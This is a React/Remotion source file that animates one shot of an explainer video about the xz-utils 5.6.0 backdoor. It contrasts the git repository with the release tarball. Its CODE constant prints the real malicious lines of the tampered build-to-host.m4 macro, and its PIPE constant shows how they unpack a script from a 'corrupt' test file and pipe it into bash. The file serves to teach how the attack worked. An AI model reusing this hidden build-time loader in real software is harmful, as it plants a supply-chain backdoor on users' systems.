// Shot 4, 0:33-0:47.5. What shipped: the git repository against the release tarball.
// A thermal scan resolves both file lists; one macro exists only in the tarball and runs hot.
import React from "react";
import { AbsoluteFill, useCurrentFrame, useVideoConfig } from "remotion";
import { C, alpha, mix } from "../lib/color";
import { MONO, SANS } from "../lib/fonts";
import { SETTLE, clamp01, ease, hash, lerp, prog } from "../lib/motion";
import { Caption, settleColor } from "../components/Type";
import { W, H } from "../components/Hud";

type Row = { git: string | null; tar: string; kind: "same" | "gen" | "hot" | "warm" };
// git column: tukaani-project/xz at v5.6.0. Tarball extras: autotools output plus the altered macro.
const ROWS: Row[] = [
  { git: "configure.ac", tar: "configure.ac", kind: "same" },
  { git: "Makefile.am", tar: "Makefile.am", kind: "same" },
  { git: null, tar: "configure", kind: "gen" },
  { git: null, tar: "Makefile.in", kind: "gen" },
  { git: "m4/ax_pthread.m4", tar: "m4/ax_pthread.m4", kind: "same" },
  { git: "m4/tuklib_common.m4", tar: "m4/tuklib_common.m4", kind: "same" },
  { git: null, tar: "m4/gettext.m4", kind: "gen" },
  { git: null, tar: "m4/libtool.m4", kind: "gen" },
  { git: null, tar: "m4/build-to-host.m4", kind: "hot" },
  { git: "src/liblzma/…", tar: "src/liblzma/…", kind: "same" },
  { git: "tests/files/bad-3-corrupt_lzma2.xz", tar: "tests/files/bad-3-corrupt_lzma2.xz", kind: "warm" },
  { git: "tests/files/good-large_compressed.lzma", tar: "tests/files/good-large_compressed.lzma", kind: "warm" },
];
const HOT_ROW = 8;
const LX = 140, RXP = 1000, PW = 760, ROW0 = 286, RS = 44, FS = 27;
const ADV = FS * 0.65; // Martian Mono advance at wdth 87.5
const SCRAMBLE = "#%&*+=-:/<>01xz";

// Exact lines from the tampered m4/build-to-host.m4 (diff against gnulib, oss-security 2024-03-30).
const CODE = [
  "gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`",
  "gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'",
  "gl_[$1]_prefix=`echo $gl_am_configmake | sed \"s/.*\\.//g\"`",
  "gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'",
  "AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt=\"eval \\$gl_[$1]_config\"])",
];
// What it expands to inside the build (from the disclosure).
const PIPE = [
  { cmd: "sed rpath …/bad-3-corrupt_lzma2.xz", what: "read the “corrupt” test file", w: 616 },
  { cmd: "tr \"\\t \\-_\" \" \\t_\\-\"", what: "swap characters back", w: 396 },
  { cmd: "xz -d", what: "decompress", w: 196 },
  { cmd: "/bin/bash", what: "run the script", w: 232 },
];

const scanX = (t: number) => lerp(80, 1840, prog(t, 34.0, 36.3, ease.inOut));

/** A file name that resolves from scramble to text as the scan passes, then cools to its colour. */
const ScanText: React.FC<{ text: string; x: number; y: number; t: number; frame: number; color: string; seed: number }> = ({ text, x, y, t, frame, color, seed }) => {
  const sx = scanX(t);
  const passT = (cx: number) => 34.0 + 2.3 * clamp01((cx - 80) / 1760); // approx time scan passes cx
  return (
    <text x={x} y={y} style={{ fontFamily: MONO, fontSize: FS, fontVariationSettings: "'wdth' 87.5, 'wght' 400" }}>
      {Array.from(text).map((ch, i) => {
        const cx = x + i * ADV;
        const passed = sx > cx;
        if (!passed) {
          const g = SCRAMBLE[Math.floor(hash(i * 31 + seed * 7 + Math.floor(frame / 2) * 131, seed) * SCRAMBLE.length)];
          return <tspan key={i} x={cx} fill={alpha(C.steel, 0.55)}>{ch === " " ? " " : g}</tspan>;
        }
        const u = (t - passT(cx)) / SETTLE;
        return <tspan key={i} x={cx} fill={settleColor(u, color)}>{ch}</tspan>;
      })}
    </text>
  );
};

export const S4Shipped: React.FC<{ start: number }> = ({ start }) => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();
  const t = start + frame / fps;

  const appear = prog(t, 33.2, 33.9, ease.out);
  const morph = prog(t, 40.5, 41.4, ease.inOut);
  const listOut = 1 - prog(t, 40.3, 40.8);
  const sx = scanX(t);
  const scanOn = t > 33.95 && t < 36.4;
  const hotOn = prog(t, 35.05, 35.5, ease.out);
  const hy = ROW0 + HOT_ROW * RS;
  const pulse = 0.75 + 0.25 * Math.sin(t * 5.2);

  // morph rect: hot row -> code panel
  const r0 = { x: RXP - 16, y: hy - 32, w: PW + 16, h: RS };
  const r1 = { x: 140, y: 146, w: 1620, h: 330 };
  const R = {
    x: lerp(r0.x, r1.x, morph), y: lerp(r0.y, r1.y, morph), w: lerp(r0.w, r1.w, morph), h: lerp(r0.h, r1.h, morph),
  };
  const codeIn = (i: number) => prog(t, 41.38 + i * 0.13, 41.72 + i * 0.13, ease.out);
  const pipeIn = (i: number) => prog(t, 42.3 + i * 0.32, 42.75 + i * 0.32, ease.out);

  const kindColor = (k: Row["kind"]) => (k === "gen" ? C.mist : k === "hot" ? C.heat4 : k === "warm" ? C.heat2 : C.frost);

  return (
    <AbsoluteFill>
      <svg width={W} height={H} viewBox={`0 0 ${W} ${H}`} style={{ position: "absolute", inset: 0 }}>
        <defs>
          <filter id="s4glow" x="-20%" y="-150%" width="140%" height="400%">
            <feGaussianBlur stdDeviation="14" />
          </filter>
          <linearGradient id="scanband" x1="0" y1="0" x2="1" y2="0">
            <stop offset="0%" stopColor={C.heat2} stopOpacity="0" />
            <stop offset="100%" stopColor={C.heat3} stopOpacity="0.35" />
          </linearGradient>
        </defs>
        {/* headers */}
        <g opacity={appear * listOut}>
          <text x={LX} y={152} fill={C.frost} style={{ fontFamily: MONO, fontSize: 42, fontVariationSettings: "'wdth' 112.5, 'wght' 300" }}>git repository</text>
          <text x={LX} y={200} fill={C.mist} style={{ fontFamily: SANS, fontSize: 30, fontWeight: 500 }}>what reviewers read</text>
          <text x={RXP} y={152} fill={C.frost} style={{ fontFamily: MONO, fontSize: 42, fontVariationSettings: "'wdth' 112.5, 'wght' 300" }}>xz-5.6.0.tar.gz</text>
          <text x={RXP} y={200} fill={C.mist} style={{ fontFamily: SANS, fontSize: 30, fontWeight: 500 }}>what distributions built</text>
          <line x1={LX} x2={LX + PW} y1={226} y2={226} stroke={alpha(C.steel, 0.8)} strokeWidth={2} />
          <line x1={RXP} x2={RXP + PW} y1={226} y2={226} stroke={alpha(C.steel, 0.8)} strokeWidth={2} />
        </g>
        {/* hot row glow (grows into the panel) */}
        {hotOn > 0 ? (
          <g>
            <rect x={R.x} y={R.y} width={R.w} height={R.h} rx={10} fill={C.heat2} opacity={0.22 * hotOn * pulse * (1 - morph * 0.7)} filter="url(#s4glow)" />
            <rect x={R.x} y={R.y} width={R.w} height={R.h} rx={10} fill={mix(C.void, C.heat0, lerp(0.7, 0.45, morph))} stroke={C.heat2} strokeWidth={lerp(2.5, 2, morph)} opacity={hotOn} />
          </g>
        ) : null}
        {/* rows */}
        <g opacity={appear * listOut}>
          {ROWS.map((r, i) => {
            const y = ROW0 + i * RS;
            return (
              <g key={i}>
                {r.git ? (
                  <ScanText text={r.git} x={LX} y={y} t={t} frame={frame} color={kindColor(r.kind)} seed={i * 2 + 1} />
                ) : (
                  <line x1={LX} x2={LX + 90} y1={y - 9} y2={y - 9} stroke={alpha(C.steel, 0.7)} strokeWidth={2} strokeDasharray="6 7" />
                )}
                <ScanText text={r.tar} x={RXP} y={y} t={t} frame={frame} color={kindColor(r.kind)} seed={i * 2 + 2} />
                {r.kind === "gen" ? (
                  <text x={RXP + PW - 4} y={y - 2} textAnchor="end" fill={C.steel} opacity={prog(sx, RXP + 300, RXP + 400)} style={{ fontFamily: SANS, fontSize: 25, fontWeight: 500 }}>generated</text>
                ) : null}
                {r.kind === "hot" ? (
                  <text x={RXP + PW - 4} y={y - 2} textAnchor="end" fill={C.heat3} opacity={hotOn} style={{ fontFamily: SANS, fontSize: 26, fontWeight: 600 }}>looks generated, was altered</text>
                ) : null}
              </g>
            );
          })}
          <text x={LX} y={ROW0 + 12 * RS + 14} fill={C.heat2} opacity={prog(t, 36.0, 36.5)} style={{ fontFamily: SANS, fontSize: 28, fontWeight: 500 }}>
            In both: two binary “test” files that no test used. They held the payload.
          </text>
        </g>
        {/* scan line */}
        {scanOn ? (
          <g>
            <rect x={sx - 150} y={110} width={150} height={760} fill="url(#scanband)" />
            <rect x={sx - 2} y={110} width={4} height={760} fill={C.heat5} />
          </g>
        ) : null}
        {/* the file name travels from its row to the panel header */}
        {t > 40.25 ? (
          <text
            x={lerp(RXP, 176, morph)} y={lerp(hy, 204, morph)} fill={mix(C.heat4, C.heat3, morph)}
            style={{ fontFamily: MONO, fontSize: lerp(FS, 32, morph), fontVariationSettings: `'wdth' ${lerp(87.5, 100, morph)}, 'wght' 400` }}
          >
            m4/build-to-host.m4
          </text>
        ) : null}
        {/* code panel */}
        {morph > 0.97 ? (
          <g>
            <text x={176 + 19 * 22.4 + 24} y={204} fill={C.mist} opacity={codeIn(0)} style={{ fontFamily: SANS, fontSize: 28, fontWeight: 500 }}>
              lines added to the gnulib macro, as shipped in the tarball
            </text>
            {CODE.map((line, i) => (
              <g key={i} opacity={codeIn(i + 1)} transform={`translate(${(1 - codeIn(i + 1)) * 24} 0)`}>
                <text x={170} y={262 + i * 44} fill={C.heat2} style={{ fontFamily: MONO, fontSize: 21.5, fontVariationSettings: "'wdth' 75, 'wght' 500" }}>+</text>
                <text x={196} y={262 + i * 44} fill={C.frost} style={{ fontFamily: MONO, fontSize: 21.5, fontVariationSettings: "'wdth' 75, 'wght' 400", whiteSpace: "pre" }}>
                  {line}
                </text>
              </g>
            ))}
          </g>
        ) : null}
        {/* pipeline */}
        {t > 42.0 ? (
          <g>
            <text x={140} y={552} fill={C.mist} opacity={pipeIn(0)} style={{ fontFamily: SANS, fontSize: 30, fontWeight: 500 }}>
              What it becomes during the build, as traced in the disclosure:
            </text>
            {(() => {
              let x = 140;
              return PIPE.map((p, i) => {
                const a = pipeIn(i);
                const bx = x;
                x += p.w + 62;
                const flow = (t * 0.9 + i * 0.25) % 1;
                return (
                  <g key={i} opacity={a} transform={`translate(0 ${(1 - a) * 20})`}>
                    <rect x={bx} y={590} width={p.w} height={84} rx={12} fill={alpha(C.heat0, 0.55)} stroke={C.heat2} strokeWidth={2.5} />
                    <text x={bx + 20} y={643} fill={C.heat5} style={{ fontFamily: MONO, fontSize: 28, fontVariationSettings: "'wdth' 75, 'wght' 400", whiteSpace: "pre" }}>
                      {p.cmd}
                    </text>
                    <text x={bx + 4} y={720} fill={C.frost} style={{ fontFamily: SANS, fontSize: 30, fontWeight: 500 }}>
                      {p.what}
                    </text>
                    {i < PIPE.length - 1 ? (
                      <g>
                        <line x1={bx + p.w + 8} x2={bx + p.w + 52} y1={632} y2={632} stroke={C.heat3} strokeWidth={3} />
                        <path d={`M ${bx + p.w + 54} 632 l -12 -8 v 16 z`} fill={C.heat3} />
                        <circle cx={bx + p.w + 8 + 40 * flow} cy={632} r={4} fill={C.heat5} opacity={prog(t, 43.6, 44.0)} />
                      </g>
                    ) : null}
                  </g>
                );
              });
            })()}
          </g>
        ) : null}
      </svg>
      <Caption
        t={t} t0={36.6} tOut={40.25} x={140} y={884} size={52} width={1640}
        text="Release tarballs usually carry generated build files that git doesn't have. *One more didn't stand out.*"
      />
      <Caption
        t={t} t0={43.3} tOut={45.45} x={140} y={824} size={52} width={1640}
        text="During configure, a script hidden in a “corrupt” test file *splices a prebuilt object into liblzma.*"
      />
      <Caption
        t={t} t0={45.6} x={140} y={824} size={52} width={1640}
        text="Only on x86-64 Linux, built with gcc and GNU ld, *inside a Debian or RPM package build.*"
      />
    </AbsoluteFill>
  );
};
